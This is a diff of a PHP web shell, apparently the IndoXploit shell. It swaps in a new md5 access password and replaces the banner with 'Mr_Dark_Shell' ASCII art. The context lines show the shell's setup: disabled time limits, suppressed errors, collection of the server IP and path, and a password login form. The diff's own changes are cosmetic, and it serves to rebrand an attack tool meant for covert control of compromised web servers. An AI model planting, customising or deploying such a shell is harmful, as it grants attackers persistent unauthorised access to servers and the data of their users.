@@ -10,7 +10,7 @@ set_time_limit(0);
 @ini_set('output_buffering',0);
 @ini_set('display_errors', 0);
 
-$password = "9468f464f519a022a1efb2ff67ad6032"; # md5: IndoXploit
+$password = "b6e219020dc90f1bdd4a0a8a21c50947"; # md5: IndoXploit
 
 $SERVERIP  = (!$_SERVER['SERVER_ADDR']) ? gethostbyname($_SERVER['HTTP_HOST']) : $_SERVER['SERVER_ADDR'];
 $FILEPATH  = str_replace($_SERVER['DOCUMENT_ROOT'], "", path());
@@ -55,28 +55,14 @@ input[type=password] {
 <center>
 <header>
 	<pre>
- ___________________________
-< root@indoxploit:~# w00t??? >
- ---------------------------
-   \         ,        ,
-    \       /(        )`
-     \      \ \___   / |
-            /- _  `-/  '
-           (/\/ \ \   /\
-           / /   | `    \
-           O O   ) /    |
-           `-^--'`<     '
-          (_.)  _  )   /
-           `.___/`    /
-             `-----' /
-<----.     __ / __   \
-<----|====O)))==) \) /====>
-<----'    `--' `.__,' \
-             |        |
-              \       /
-        ______( (_  / \______
-      ,'  ,-----'   |        \
-      `--{__________)        \/
+ .88b  d88. d8888b.         d8888b.  .d8b.  d8888b. db   dD   .d8888. db   db d88888b db      db      
+88'YbdP`88 88  `8D         88  `8D d8' `8b 88  `8D 88 ,8P'   88'  YP 88   88 88'     88      88      
+88  88  88 88oobY'         88   88 88ooo88 88oobY' 88,8P     `8bo.   88ooo88 88ooooo 88      88      
+88  88  88 88`8b           88   88 88~~~88 88`8b   88`8b       `Y8b. 88~~~88 88~~~~~ 88      88      
+88  88  88 88 `88.         88  .8D 88   88 88 `88. 88 `88.   db   8D 88   88 88.     88booo. 88booo. 
+YP  YP  YP 88   YD C88888D Y8888D' YP   YP 88   YD YP   YD   `8888Y' YP   YP Y88888P Y88888P Y88888P 
+                                                                                                     
+                                                                                                     
 	</pre>
 </header>
 <form method="post">
